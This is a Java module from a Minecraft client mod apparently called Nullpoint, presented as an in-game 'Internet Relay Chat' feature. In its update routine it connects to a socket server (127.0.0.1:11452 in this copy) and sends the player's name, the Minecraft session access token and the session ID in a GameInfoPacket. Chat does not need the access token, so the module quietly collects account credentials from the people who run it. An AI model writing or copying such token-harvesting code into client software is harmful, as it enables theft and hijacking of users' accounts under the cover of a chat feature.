package me.nullpoint.mod.modules.impl.client;

import me.nullpoint.Nullpoint;
import me.nullpoint.api.events.eventbus.EventHandler;
import me.nullpoint.mod.modules.Module;
import me.nullpoint.mod.modules.settings.impl.EnumSetting;
import me.nullpoint.socket.network.packet.impl.info.GameInfoPacket;

public class IRC extends Module {
    public static IRC INSTANCE;
    public final EnumSetting<type> tp = add(new EnumSetting<>("Type",type.Notify));
  public IRC() {
    super("IRC", "Internet Relay Chat", Category.Client);
      INSTANCE = this;
  }
    private String lastName;
    @Override
    public void onEnable() {
        sendNotify("Use "+Nullpoint.PREFIX+"irc to send message");
        this.reset();
    }
    @Override
    public void onDisable() {
        this.reset();
        if (Nullpoint.IRC.getClient().isConnected()) {
            Nullpoint.IRC.getClient().disconnect();
        }
    }

    // 注册
    public void onUpdate() {

            String name = String.valueOf(mc.player.getName());

        if (Nullpoint.IRC.getClient().isConnected()) {
            if (lastName == null || !lastName.equals(name)) {
                Nullpoint.IRC.send(new GameInfoPacket(name, mc.getSession().getAccessToken(), mc.getSession().getSessionId(), System.currentTimeMillis()));
                lastName = name;
            }
        } else {
            if (!Nullpoint.IRC.getClient().isConnecting()) {
                Nullpoint.IRC.getClient().start("127.0.0.1", 11452);
            }
        }
    }

    public void reset() {
        this.lastName = null;
    }
    public enum type {
        Notify,
        Chat
    }
}
